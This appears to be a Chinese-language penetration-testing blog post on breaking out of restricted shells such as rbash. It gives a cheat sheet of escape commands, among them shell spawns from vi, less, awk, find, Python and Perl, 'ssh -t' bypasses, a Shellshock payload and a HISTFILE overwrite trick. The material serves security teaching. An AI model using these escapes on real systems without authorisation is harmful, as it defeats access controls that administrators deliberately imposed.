---
title: 摆脱受限的shell
layout: post
tags:
  - sec
  - skills
  - rbash
  - information
  - shell
category: 
  - hack
  - skills
comments: true
share: true
---

* TOC
{:toc}

在渗透过程中，会遇到有些环境中的shell是受限制的，这些shell环境叫[restricted shell](https://en.wikipedia.org/wiki/Restricted_shell)

<!--more-->

## 受限shell

受限shell环境的命令是有限的，很多不能运行，比如：

- `cd`切换目录
- 设置或者是取消环境变量设置
- 包含`/`的命令
- 不能使用`>`、`>>`、`>|`、`>&`、`>&`重定向操作符
- 不能使用内建命令

为什么会有受限的shell？

受限的shell是为了增加系统的安全性，极大减少攻击性，限制对系统命令的使用，比如router、磁盘管理、网络管理工具的命令。甚至不能使用管理员功能。

受限shell类型大概有：

- rbash
- rsh
- rksh
- Python(lshell)

## 打破受限shell

**了解基本情况：**

尽量找出自己所处环境是什么样子：

- 运行`env`查看环境变量
- 运行`echo $PATH`查找路径设置
- 运行`echo $SHELL`或者`echo $0`查看运行的shell环境
- 查看基本的Unix命令，比如ls,pwd,cd ..,env,set,export,vi,cp,mv

**shell变量和路径设置：**

- 如果`/`允许使用，直接运行`/bin/sh`
- 如果可以进行路径设置、shell变量设置，就可以运行：
  - `export PATH=/bin:/usr/bin:$PATH`
  - `export SHELL=/bin/sh`
- 如果可以复制文件到存在的路径，就可以运行`cp /bin/sh /some/dir/from/PATH; sh`


**深入扩展信息：**

仔细研究可以使用的所有命令参数和附加信息也很有帮助。

有一些系统命令常常可以绕过限制：

- ftp->`!/bin/sh`
- gdb->`!/bin/sh`
- more/less/man->`!/bin/sh`
- vi/vim->`:!/bin/sh`
- scp -S `tmp/getMeOut.sh x y`
- awk 'BEGIN {system('/bin/sh')}'
- find / -name someName -exec `/bin/sh \;`

**逃脱限制：**

- 在远程shell连接加载完成之前执行系统命令
  - `ssh test@IP -t '/bin/sh'`
- 在远程shell开始的时候，不加载限制配置文件
  - `ssh test@IP -t "bash --noprofile"`
- 尝试破壳漏洞
  - `ssh test@IP -t "() { :; }; /bin/bash"` 


**更加深入：**

- 使用`tee`命令
  - echo "your evil code" | tee script.sh
- 通过脚本语言调用shell
  - `python -c 'import os; os.system("/bin/bash")'` 
  - perl -e 'exec "/bin/sh";'
- 历史文件技巧
  - 将一个想要重写的文件中设置HISTFILE变量
  - 将HISTFILE变量从0到100逐渐递增
  - 执行文件中每行写入的内容
  - 登出并重新登陆。这样就将所想写入的内容指向了HISTFILE文件(原文件权限保持不变)

## Refer

- http://pentestmonkey.net/blog/rbash-scp
- https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells